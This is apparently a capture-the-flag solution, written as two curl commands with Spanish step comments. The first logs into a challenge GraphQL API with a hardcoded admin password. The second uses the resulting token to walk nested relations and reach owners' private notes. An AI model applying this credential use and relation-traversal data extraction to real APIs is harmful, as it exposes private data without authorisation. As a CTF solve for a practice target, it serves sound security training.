# Paso 1: Login
curl -X POST -H "Content-Type: application/json" -d "{\"query\":\"mutation { login(username: \\\"brunner_admin\\\", password: \\\"Sw33tT00Th321?\\\") { token user { displayName } } }\"}" https://brunner-s-bakery.challs.brunnerne.xyz/graphql

# Paso 2: Obtener flag (completar con TOKEN del paso 1)
curl -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIU..." -d "{\"query\":\"query { secretRecipes { ingredients { supplier { owner { privateNotes } } } } }\"}" https://brunner-s-bakery.challs.brunnerne.xyz/graphql



